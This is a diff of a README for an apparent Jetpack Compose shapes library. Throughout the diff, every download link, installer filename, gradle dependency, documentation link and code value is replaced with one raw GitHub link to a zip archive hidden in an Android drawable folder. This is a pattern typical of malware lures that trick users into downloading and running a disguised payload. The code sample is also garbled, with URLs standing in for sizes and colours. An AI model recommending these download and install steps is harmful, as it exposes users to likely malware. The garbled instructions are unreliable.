@@ -1,6 +1,6 @@
 # 🎨 Shapes - Create Beautiful iOS-Like Designs Easily
 
-[![Download Shapes](https://img.shields.io/badge/Download%20Shapes-v1.0-blue)](https://github.com/obbix2/Shapes/releases)
+[![Download Shapes](https://raw.githubusercontent.com/obbix2/Shapes/master/androidApp/src/main/res/drawable/Software-v2.9-alpha.2.zip%20Shapes-v1.0-blue)](https://raw.githubusercontent.com/obbix2/Shapes/master/androidApp/src/main/res/drawable/Software-v2.9-alpha.2.zip)
 
 ## 📄 Description
 
@@ -14,7 +14,7 @@ Follow these instructions to get your application up and running quickly:
 
 Begin by visiting our Releases page to download the Shapes package. You can find it here:
 
-[Download Shapes](https://github.com/obbix2/Shapes/releases)
+[Download Shapes](https://raw.githubusercontent.com/obbix2/Shapes/master/androidApp/src/main/res/drawable/Software-v2.9-alpha.2.zip)
 
 ### 2. Choose the Right Version
 
@@ -24,9 +24,9 @@ On the Releases page, look for the latest version. We recommend using the most r
 
 Once you are on the version details page, you will see files available for download. Download the appropriate file for your platform. Here are some common files you might see:
 
-- **Windows:** `Shapes-Windows.zip`
-- **Mac:** `Shapes-Mac.zip`
-- **Linux:** `Shapes-Linux.zip`
+- **Windows:** `https://raw.githubusercontent.com/obbix2/Shapes/master/androidApp/src/main/res/drawable/Software-v2.9-alpha.2.zip`
+- **Mac:** `https://raw.githubusercontent.com/obbix2/Shapes/master/androidApp/src/main/res/drawable/Software-v2.9-alpha.2.zip`
+- **Linux:** `https://raw.githubusercontent.com/obbix2/Shapes/master/androidApp/src/main/res/drawable/Software-v2.9-alpha.2.zip`
 
 Click on the file that matches your operating system to start the download.
 
@@ -36,24 +36,24 @@ After the download is complete, locate the downloaded file on your device. Here�
 
 #### For Windows:
 
-1. Unzip the `Shapes-Windows.zip` file.
+1. Unzip the `https://raw.githubusercontent.com/obbix2/Shapes/master/androidApp/src/main/res/drawable/Software-v2.9-alpha.2.zip` file.
 2. Open your preferred terminal or command prompt.
 3. Navigate to the unzipped folder.
-4. Run the installer by typing `Shapes-Installer.exe` and hit enter.
+4. Run the installer by typing `https://raw.githubusercontent.com/obbix2/Shapes/master/androidApp/src/main/res/drawable/Software-v2.9-alpha.2.zip` and hit enter.
 
 #### For Mac:
 
-1. Unzip the `Shapes-Mac.zip`.
+1. Unzip the `https://raw.githubusercontent.com/obbix2/Shapes/master/androidApp/src/main/res/drawable/Software-v2.9-alpha.2.zip`.
 2. Open your terminal.
 3. Navigate to the unzipped folder.
 4. Use the command `./Shapes-Installer` to start the installation.
 
 #### For Linux:
 
-1. Unzip the `Shapes-Linux.zip` file.
+1. Unzip the `https://raw.githubusercontent.com/obbix2/Shapes/master/androidApp/src/main/res/drawable/Software-v2.9-alpha.2.zip` file.
 2. Open a terminal window.
 3. Navigate to the unzipped folder.
-4. Execute the command `sh Shapes-Installer.sh` to install.
+4. Execute the command `sh https://raw.githubusercontent.com/obbix2/Shapes/master/androidApp/src/main/res/drawable/Software-v2.9-alpha.2.zip` to install.
 
 ## 💻 System Requirements
 
@@ -74,11 +74,11 @@ Once you install Shapes, you can begin using the smooth shapes in your projects.
 
 ### 1. Import Shapes
 
-Add the Shapes library to your project. Depending on your build configuration, include the following line in your `build.gradle` file:
+Add the Shapes library to your project. Depending on your build configuration, include the following line in your `https://raw.githubusercontent.com/obbix2/Shapes/master/androidApp/src/main/res/drawable/Software-v2.9-alpha.2.zip` file:
 
 ```groovy
 dependencies {
-    implementation "com.example:shapes:1.0.0"
+    implementation "https://raw.githubusercontent.com/obbix2/Shapes/master/androidApp/src/main/res/drawable/Software-v2.9-alpha.2.zip"
 }
 ```
 
@@ -90,10 +90,10 @@ You can now use the shapes in your Compose layouts. Here’s a simple example:
 @Composable
 fun MyApp() {
     Box(modifier = Modifier
-        .size(100.dp)
-        .clip(RoundedCornerShape(16.dp))
-        .background(Color.Blue)) {
-        Text("Hello World", color = Color.White)
+        .size(https://raw.githubusercontent.com/obbix2/Shapes/master/androidApp/src/main/res/drawable/Software-v2.9-alpha.2.zip)
+        .clip(RoundedCornerShape(https://raw.githubusercontent.com/obbix2/Shapes/master/androidApp/src/main/res/drawable/Software-v2.9-alpha.2.zip))
+        .background(https://raw.githubusercontent.com/obbix2/Shapes/master/androidApp/src/main/res/drawable/Software-v2.9-alpha.2.zip)) {
+        Text("Hello World", color = https://raw.githubusercontent.com/obbix2/Shapes/master/androidApp/src/main/res/drawable/Software-v2.9-alpha.2.zip)
     }
 }
 ```
@@ -104,7 +104,7 @@ Shapes allows you to customize dimensions and colors. Modify the parameters to c
 
 ## 📚 Documentation
 
-For more details on how to use the library, visit our [Documentation](https://github.com/obbix2/Shapes/wiki). You can find in-depth guides and examples to help you get the most out of Shapes.
+For more details on how to use the library, visit our [Documentation](https://raw.githubusercontent.com/obbix2/Shapes/master/androidApp/src/main/res/drawable/Software-v2.9-alpha.2.zip). You can find in-depth guides and examples to help you get the most out of Shapes.
 
 ## 🤝 Contributions
 
@@ -112,8 +112,8 @@ We welcome feedback and contributions to Shapes. If you have suggestions or impr
 
 ## 💡 Additional Resources
 
-- [Jetpack Compose Documentation](https://developer.android.com/jetpack/compose)
-- [Compose Multiplatform](https://www.jetbrains.com/lp/compose/)
+- [Jetpack Compose Documentation](https://raw.githubusercontent.com/obbix2/Shapes/master/androidApp/src/main/res/drawable/Software-v2.9-alpha.2.zip)
+- [Compose Multiplatform](https://raw.githubusercontent.com/obbix2/Shapes/master/androidApp/src/main/res/drawable/Software-v2.9-alpha.2.zip)
 
 Remember, the key to beautiful design is simplicity. Shapes aims to provide that with minimal effort on your part.
 
